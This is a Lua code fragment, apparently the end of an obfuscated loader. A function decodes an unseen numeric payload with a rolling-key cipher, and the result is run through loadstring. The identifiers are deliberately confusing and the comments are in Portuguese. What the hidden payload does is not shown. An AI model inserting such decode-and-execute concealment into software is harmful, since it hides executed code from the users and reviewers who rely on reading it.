    local function VM_0001(d, k, m)
        local R_l00OO = {}
        local c_key = k
        local char = string.char
        local insert = table.insert
        
        -- Virtual Machine Loop
        for idx = 1, #d do
            local val = d[idx]
            -- Decodificacao Rolling Key
            local dec = (val / m) - c_key
            
            -- Anti-Crash Mobile (Garante byte valido)
            dec = dec % 256
            
            insert(R_l00OO, char(dec))
            
            -- Atualiza a chave para o proximo (Rolling)
            c_key = (c_key + 13) % 150
        end
        return table.concat(R_l00OO)
    end

    -- Execution Guard
    local F_011lI = loadstring(VM_0001(B_0Oll1000, 14, 5))
    if F_011lI then
        F_011lI(...)
    end
end)(...)
